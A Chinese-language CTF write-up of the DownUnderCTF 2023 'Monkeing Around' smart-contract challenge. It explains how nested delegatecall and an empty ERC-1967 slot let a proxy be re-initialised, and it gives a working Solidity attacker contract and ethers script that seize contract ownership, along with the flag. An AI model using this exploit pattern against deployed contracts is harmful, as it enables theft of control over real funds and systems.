# DownUnderCTF 2023 Monkeing Around Writeup

## 题目简述

`MonkeingAround` 允许对两个白名单地址执行 `delegatecall`：一个 `MonkeMath` 实现合约和一个可初始化代理。完成条件是把 `MonkeingAround.owner` 改为玩家地址。漏洞来自多层 `delegatecall` 共用调用者存储，以及代理初始化状态被错误地从外层合约上下文读取。

## 解题过程

`doSomeMonkeMath` 对白名单代理执行 `delegatecall`，所以代理代码运行时读写的是 `MonkeingAround` 的存储。代理的 `init` 检查 ERC-1967 implementation slot；该特殊 slot 在外层合约中从未使用，值为零，因此即使代理本身早已初始化，在这次上下文中仍能再次调用 `init`。

先部署一个与目标前两个存储槽对齐的实现：

```solidity
pragma solidity ^0.8.19;

contract SolveContract {
    address[] public dummyArray; // slot 0，对齐 allowlisted
    address public owner;        // slot 1，对齐 owner

    function solve(address newOwner) external {
        owner = newOwner;
    }
}
```

第一步，把 `init(SolveContract, "")` 的 calldata 交给外层合约：

```text
MonkeingAround
  delegatecall -> InitializableProxy.init
  写入 MonkeingAround 的 ERC-1967 implementation slot
```

第二步，再把 `solve(player)` 的 calldata 交给同一个白名单代理：

```text
MonkeingAround
  delegatecall -> InitializableProxy fallback
  delegatecall -> SolveContract.solve
  写入 MonkeingAround 的 slot 1
```

使用 ethers 构造两次调用的核心代码为：

```typescript
const proxy = await challenge.allowlisted(0);
const solver = await (await ethers.getContractFactory("SolveContract", player)).deploy();

const iface = new ethers.Interface([
  "function init(address,bytes)",
  "function solve(address)"
]);

const initData = iface.encodeFunctionData("init", [await solver.getAddress(), "0x"]);
await (await challenge.doSomeMonkeMath(proxy, initData)).wait();

const solveData = iface.encodeFunctionData("solve", [player.address]);
await (await challenge.doSomeMonkeMath(proxy, solveData)).wait();
```

`owner()` 最终返回玩家地址，完成接口给出：

```text
DUCTF{delgate_to_a_delegate_to_a_delegate_to_a_delegate}
```

## 方法总结

`delegatecall` 保留外层调用者的地址和存储上下文。白名单只约束第一跳地址，并不能约束代理随后委托到哪个实现；同时，代理的初始化标记存在 ERC-1967 slot，在外层上下文中为零。修复时应避免对不受严格约束的代理执行委托调用，并将初始化状态和升级权限绑定到正确的代理存储上下文。
